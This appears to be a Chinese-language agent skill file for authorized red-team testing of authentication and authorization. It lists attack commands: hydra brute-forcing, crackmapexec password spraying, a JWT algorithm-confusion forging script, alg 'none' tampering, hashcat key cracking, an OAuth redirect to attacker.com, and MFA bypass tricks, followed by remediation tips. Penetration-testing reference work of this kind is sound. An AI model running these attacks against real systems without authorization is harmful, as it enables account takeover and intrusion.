---
name: redteam-auth
description: "认证与授权漏洞测试 — 密码策略、JWT/Token、OAuth、MFA 绕过。授权安全测试使用。"
version: 1.0.0
author: Hermes Agent (inspired by VulnClaw redteam-auth-detail-pack)
license: MIT
metadata:
  hermes:
    tags: [authentication, authorization, jwt, oauth, mfa-bypass, session-security]
---

# 认证与授权漏洞测试

## 密码策略测试

```bash
# 弱密码检测
hydra -L users.txt -P passwords.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# 密码喷洒（防锁定）
crackmapexec smb TARGET -u users.txt -p 'Password123' --continue-on-success
```

## JWT 攻击

```bash
# 算法混淆（RS256 → HS256）
# 1. 获取公钥
curl -s https://TARGET/.well-known/jwks.json

# 2. 用公钥作为 HMAC 密钥签名
python3 -c "
import jwt
token = jwt.encode({'user': 'admin'}, 'PUBLIC_KEY_CONTENT', algorithm='HS256')
print(token)
"

# 空算法（none）
# 修改 header: {"alg": "none"}

# 密钥爆破
hashcat -m 16500 jwt.txt wordlist.txt
```

## OAuth 攻击

- redirect_uri 绕过：`https://TARGET/callback?redirect_uri=https://attacker.com`
- state 参数缺失/可预测
- 授权码拦截（无 PKCE）

## MFA 绕过

- 暴力破解 6 位数字（无速率限制时）
- 响应篡改：`{"success": false}` → `{"success": true}`
- 跳过 MFA 步骤直接访问后续端点

## 修复建议

1. 强密码策略 + 账户锁定
2. JWT 使用 RS256 + 密钥轮换
3. OAuth 强制 PKCE + state 参数
4. MFA 速率限制 + 防重放

## 参考资源

- OWASP Authentication Cheat Sheet
- JWT Security Best Practices
